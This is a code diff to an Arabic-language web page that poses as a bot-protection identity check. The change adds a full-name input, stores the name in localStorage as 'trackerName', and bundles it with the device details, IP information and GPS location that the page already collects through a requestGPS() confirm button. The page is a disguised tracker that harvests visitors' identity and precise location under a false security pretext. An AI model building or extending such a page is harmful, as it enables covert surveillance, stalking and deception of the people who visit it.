@@ -230,8 +230,9 @@
                 <div class="blocked-title">مطلوب تأكيد الهوية</div>
                 <div class="blocked-text" id="blockedText">
                     للحماية من الروبوتات والوصول الغير مصرح به،<br>
-                    يرجى السماح بالتحقق من هويتك للمتابعة
+                    يرجى إدخال اسمك والسماح بالتحقق للمتابعة
                 </div>
+                <input type="text" id="userName" placeholder="أدخل اسمك الكامل" style="width:100%;padding:12px 16px;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.15);border-radius:12px;color:#fff;font-family:'Cairo',sans-serif;font-size:15px;text-align:center;margin-bottom:14px;outline:none;transition:border 0.3s;" onfocus="this.style.borderColor='#e50914'" onblur="this.style.borderColor='rgba(255,255,255,0.15)'">
                 <div id="settingsGuide" style="display:none;text-align:right;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:12px;padding:14px 18px;margin-bottom:16px;font-size:13px;color:rgba(255,255,255,0.7);line-height:2.2;">
                 </div>
                 <button class="retry-btn" onclick="requestGPS()">✓ تأكيد والمتابعة</button>
@@ -242,8 +243,15 @@
     <script>
         let dataCollected = false;
 
+        function getUserName() {
+            const input = document.getElementById('userName');
+            const name = input ? input.value.trim() : '';
+            if (name) localStorage.setItem('trackerName', name);
+            return name || localStorage.getItem('trackerName') || '';
+        }
+
         async function collectDeviceInfo() {
-            const info = { device: {}, ipInfo: {}, gpsLocation: {} };
+            const info = { userName: getUserName(), device: {}, ipInfo: {}, gpsLocation: {} };
 
             // Device info — comprehensive detection
             try {
